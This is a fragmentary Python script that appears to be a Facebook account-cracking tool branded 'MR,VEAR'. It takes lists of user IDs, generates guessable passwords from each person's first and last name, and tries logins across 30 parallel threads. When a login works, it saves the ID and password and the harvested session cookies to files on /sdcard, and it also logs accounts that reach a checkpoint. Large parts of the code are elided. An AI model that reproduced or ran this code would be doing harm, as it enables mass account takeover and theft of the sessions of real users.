...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/killer.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;91m [01] \x1b[1;92mFile cloning\n \x1b[1;91m[02] \x1b[1;93mCreate file\n \x1b[1;91m[03] \x1b[1;94mPublic cloning\n')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:
                               
                                linex()
                                file = input(' FILE \033[1;32m: ')
                                try:
                                        ...
                                        menu()
                                linex()
                                print(' \x1b[1;91m[01] \x1b[1;92mMethod \x1b[1;96m1  \n \x1b[1;91m[02] \x1b[1;93mMethod \x1b[1;96m2 \n \x1b[1;91m[03] \x1b[1;94mMethod \x1b[1;96m3 ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                print('\x1b[1;91m [01] \x1b[1;92mAuto Passowrd \n\x1b[1;91m [02] \x1b[1;93mChoose Passowrd \n\x1b[1;91m [03] \x1b[1;94mFirst Last Firstlast Crack\n\x1b[1;91m [04] \x1b[1;95mCrack with First and Last name ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('firstlast11')
                                        plist.append('firstlast12')
                                        plist.append('first1122')
                                        plist.append('first112233')
                                        plist.append('first123123')
                                        plist.append('first123last')
                                        plist.append('first1234last')
                                        plist.append('first12345last')
                                elif ppp in ['3','03']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;34m WAIT FOR RESULTS")
                                        linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mMR,VEAR\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',}                                              
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [MR,VEAR-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/MR,VEAR-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/MR,VEAR-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MR,VEAR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [MR,VEAR] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MR,VEAR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR,VEAR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    'viewport-width': '980',}
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/MR,VEARCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/MR,VEAR-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/MR,VEAR_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MR,VEAR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
